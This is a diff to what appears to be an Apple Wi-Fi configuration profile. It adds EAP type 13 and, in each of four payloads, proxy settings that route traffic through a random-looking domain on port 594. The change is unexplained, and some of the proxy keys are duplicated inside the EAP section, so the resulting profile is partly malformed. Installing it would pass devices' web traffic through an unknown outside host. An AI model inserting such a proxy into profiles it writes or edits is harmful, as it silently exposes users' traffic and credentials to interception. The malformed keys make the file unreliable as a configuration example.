@@ -30,6 +30,11 @@
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
                         <key>EAPClientConfiguration</key>
@@ -37,7 +42,14 @@
 
                                 <key>AcceptEAPTypes</key>
  				<array>
+                                <integer>13</integer>
  				</array>
+
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
 
@@ -73,6 +85,11 @@
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
                         <key>EAPClientConfiguration</key>
@@ -80,7 +97,14 @@
 
                                 <key>AcceptEAPTypes</key>
  				<array>
+                                <integer>13</integer>
  				</array>
+
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
 
@@ -116,6 +140,11 @@
 			<key>PayloadVersion</key>
 			<integer>1</integer>			
 
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
                         <key>EAPClientConfiguration</key>
@@ -123,7 +152,14 @@
 
                                 <key>AcceptEAPTypes</key>
  				<array>
+                                <integer>13</integer>
  				</array>
+
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
 
@@ -159,6 +195,11 @@
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
                         <key>EAPClientConfiguration</key>
@@ -166,7 +207,14 @@
 
                                 <key>AcceptEAPTypes</key>
  				<array>
+                                <integer>13</integer>
  				</array>
+
+                        <key>ProxyServer</key>
+                        <string>sjejjdjrrjrh7272773837377372727hshsj.com</string>
+			<key>ProxyServerPort</key>
+                        <integer>594</integer>
+
                         <key>ProxyCaptiveLoginAllowed</key>
                         <false/>
 
